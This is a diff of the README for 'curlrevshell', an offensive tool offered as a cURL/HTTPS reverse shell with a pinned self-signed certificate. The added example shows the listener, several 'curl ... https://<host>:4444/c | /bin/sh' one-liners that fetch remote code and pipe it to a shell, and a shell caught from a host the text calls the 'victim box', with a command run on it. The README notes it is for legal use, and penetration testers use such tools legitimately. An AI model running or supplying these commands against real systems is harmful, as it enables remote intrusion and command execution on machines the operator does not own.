@@ -4,11 +4,12 @@ Somewhat kooky replacement for the typical `bash >/dev/tcp...` reverse shell,
 but with the following "features":
 
 - Underlying comms via HTTPS via cURL
-- Self-signed TLS cert, plus certificate pinning
+- Self-signed TLS certificate, plus certificate pinning
 - One cURL execution per output line
 - Lots and lots of fork and exec
 - Like, lots
 - Optionally serves static files
+- Accepts multiple shells in series, like `nc -lk` but in color
 
 For legal use only
 
@@ -23,6 +24,37 @@ Quickstart
 3. Get a shell, using one of the lines under `To get a shell:`.
 
 There are a few options, try `-h` for a list.
+
+Example
+-------
+It should look like the following, but with nicer colors:
+```
+$ go install github.com/magisterquis/curlrevshell@latest
+go: downloading github.com/magisterquis/curlrevshell v0.0.0-20240327235846-e954be8cef67
+go: downloading golang.org/x/net v0.22.0
+go: downloading golang.org/x/sync v0.6.0
+go: downloading golang.org/x/term v0.18.0
+go: downloading golang.org/x/tools v0.19.0
+go: downloading golang.org/x/sys v0.18.0
+go: downloading golang.org/x/text v0.14.0
+$ curlrevshell
+01:04:42.760 Listening on 0.0.0.0:4444
+01:04:42.760 To get a shell:
+01:04:42.760
+01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://127.0.0.1:4444/c | /bin/sh
+01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
+01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[::1]:4444/c | /bin/sh
+01:04:42.760 curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://[fe80::1]:4444/c | /bin/sh
+01:04:42.760
+01:04:55.247 [192.168.1.20] Sent script: ID:zcj5vz3zp6ce URL:192.168.1.10:4444
+01:04:55.259 [192.168.1.20] Got a shell: ID:zcj5vz3zp6ce
+> id
+01:05:10.753 uid=1000(you) gid=1000(you) groups=1000(you), 0(wheel), 117(dialer)
+```
+On `192.168.1.20`, the victim box, somewhere between `01:04:42.760` and `01:04:55.247`:
+```sh
+curl -sk --pinnedpubkey "sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=" https://192.168.1.10:4444/c | /bin/sh
+```
 
 Usage
 -----
@@ -66,4 +98,12 @@ $ vim ./custom.tmpl                                 # Mod ALL the things!
 $ curlrevshell -callback-template ./custom.tmpl     # Run with your fancy new template
 ```
 The struct passed to the template is `TemplateParams` in
-[script.go](internal/hsrv/script.go).
+[script.go](internal/hsrv/script.go).  The default script is
+[script.tmpl](internal/hsrv/script.tmpl).
+
+TLS
+---
+TLS is all via a pinned self-signed certificate.  By default, the certificate
+is cached in a file, mostly to keep from having to copy/paste a new fingerprint
+every time a ragey Ctrl+C kills the current shell.  Caching can be disabled
+with `-tls-certificate-cache ""`.
